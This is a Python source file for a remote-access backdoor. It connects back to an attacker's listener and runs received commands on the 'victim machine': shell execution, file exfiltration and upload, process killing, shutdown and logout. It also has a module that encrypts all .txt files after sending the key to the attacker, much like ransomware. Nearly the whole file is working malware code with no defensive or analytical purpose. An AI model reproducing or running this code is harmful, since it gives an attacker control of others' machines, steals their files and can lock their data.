__author__ = "Abenezer"

from Imports import *


class Encrypto:
    """A class used to encrypt/decrypt diractory level text files --> (.txt) files only"""
    def __init__(self):
        self.key = Fernet.generate_key()
        self.fernetObject = Fernet(self.key)
        self.ciphterText = "" 
        self.PlainText = ""
        self.saveKey()

        
    def encrypt(self):
        for path,_,files in os.walk('./'):
            if files:
                for f in files:
                    if f.endswith('.txt'): # You can change your file extension here
                        with open(os.path.join(path,f),'rb') as file:
                            self.cipherText = self.fernetObject.encrypt(file.read())
                            
                        with open(os.path.join(path,f),'wb') as file:
                            file.write(self.cipherText)
                            
                        self.cipherText = ""

                        
    def saveKey(self):
        if not os.path.isfile('FernetKey.txt'):
            with open('FernetKey.txt','wb') as  file:
                file.write(self.key)
            
                        
    def decrypt(self):
        if os.path.isfile('FernetKey.txt'):
            with open("FernetKey.txt",'r') as file:
                self.key = file.read()
                self.fernetObject = Fernet(self.key)
                
        for path,_,files in os.walk('./'):
            if files:
                for f in files:
                    if f.endswith('.txt'):
                        with open(os.path.join(path,f),'r') as file:
                            self.PlainText = self.fernetObject.decrypt(file.read().encode())
                        
                        with open(os.path.join(path,f),'wb') as file:
                            file.write(self.PlainText)
                            
                        self.PlainText = ""
                        
    def __str__(self) -> str:
        return "Encrypto"



class Backdoor:
    def __init__(self,ip,port):        
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    
    def listOfProcesses(self):
        """A function used for listing all the background processes of the victim machine"""
        pid_dict = {}
        for pid in psutil.pids():
            pid_dict[pid] = psutil.Process(pid).name()
        
        return pid_dict


    def killProcessByName(self,processName):    
        """A function used for killing background processes form the victim machine"""
        PID = None
        listOfProcess = self.listOfProcesses()
        try:
            for pid,pidName in listOfProcess.items():
                if pidName == processName:
                    PID = pid
                    break
                
            if PID != None:        
                process = psutil.Process(PID)
            else:
                print(f"Error: No process named {processName} found!")
                print("Please make  Sure the process exist and try again!")
                exit(1)
                
        except Exception as e:
            exit(1)
            
        else:
            for proc in process.children(recursive=True):
                proc.kill()
            process.kill()
            return "Process killed successfully!"

        
    def recive(self,conn):
        """A function used for reciving commands from the attacker machine"""
        json_data = ""
        
        while True:
            try:
                json_data += conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    
    def sysInfo(self):
        """A function used for getting the systemInfo of the victim machine"""
        try:
            info={}
            info['platform']=platform.system()
            info['platform-release']=platform.release()
            info['platform-version']=platform.version()
            info['architecture']=platform.machine()
            info['hostname']=socket.gethostname()
            info['ip-address']=socket.gethostbyname(socket.gethostname())
            info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
            info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+"GB"
            return info
        except Exception as e:
            logging.exception(e)
            
            
    def shutDown(self):
        """A function used for shutDowning the victim machine"""
        if platform.system() == "Windows":
            os.system("shutdown /s /t 0")
        else:
            os.system("systemctl poweroff")
   
            
    def restart(self):
        """A function used for restarting the victim machine"""
        if platform.system() == 'Windows':
            os.system("shutdown /r /t 0")
        else:
            os.system("systemctl reboot")
    
            
    def logOut(self): 
        """A function used for loging out the victim machine"""
        if platform.system() == "Windows":
            os.system("shutdown /l /t 0")
        else:
            os.system("pkill --KILL -U {0}".format(subprocess.check_output('uname -n',shell=True,text=True)))
            
    
    def download(self,path):
        """A function used for sending the victim files to the attacker machine"""
        with open(path, 'rb')  as file:
           return base64.b64encode(file.read())
        
        
    def upload(self,path,data):
        "A function used for writing(downloading) the attacker's file to the victim machine"
        with open(path,'wb') as file:
            file.write(base64.b64decode(data))    
    
    
    def send(self,data):
        """A function used for sending command response to the attacker machine"""
        self.connection.send(json.dumps(data).encode())
        
        
    def changeDir(self,path):
        """A function used for changing the current working diractory of the victim maching"""
        os.chdir(path)
        return " changed diractory to {}".format(path)
        
        
    def executeSystemCommand(self,command):
        """A function used for executing system commands on the victim machine"""
        return subprocess.check_output(command)
    
    
    def startBackdoor(self):
        """A function used for starting the backdoor"""
        resultList = ""
        while True:
            command = self.connection.recv(1024).decode()
            command = json.loads(command).split()
            if command[0] == "exit":
                self.connection.close()
                os.system('clear')
                exit(0)         
                
            elif command[0].lower() == "sysinfo" and len(command) ==1:
                self.send(self.sysInfo())
                
            elif command[0].lower() == "bgps" and len(command) == 1:
                print("sertowal...")
                self.send(self.listOfProcesses())

            elif command[0].lower() == "kill" and len(command) > 1:
                self.send(self.killProcessByName(command[1]))
                
            elif command[0].lower() == "encrypt" and len(command) == 1:
                encrypto = Encrypto()
                self.send(self.download("FernetKey.txt").decode())
                encrypto.encrypt()
                
            elif command[0].lower() == "decrypt" and len(command) == 1:
                self.send("Decrypting...")
                self.upload("FernetKey.txt",self.recive(self.connection))
                encrypto = Encrypto()
                encrypto.decrypt()
                
            elif command[0].lower() == "cd" and len(command) > 1:
                self.send(self.changeDir(command[1]))
                
            elif command[0].lower() == "download" and len(command) > 1:
                self.send(self.download(command[1]).decode())
            
            elif command[0].lower() == "upload" and len(command) > 1:
                self.send("Okay Sir")
                self.upload(command[1],self.recive(self.connection))
            
            elif command[0].lower() == "shutdown" and len(command) == 1:
                self.shutDown()
                
            elif command[0].lower() == "restart" and len(command) == 1:
                self.restart()
                
            elif command[0].lower() == "logout" and len(command) == 1:
                self.logOut()
                
            else:
                result = self.executeSystemCommand(command)
                result = result.decode().split('\n')
                for i in result:
                    resultList += i
                    resultList += '\n'
                self.send(resultList)
                resultList = ""

                
    def __str__(self):
        return f'Backdoor'


                
def main():
    backdoor = Backdoor('localhost',4444)
    backdoor.startBackdoor()


if __name__ == "__main__":
    main()
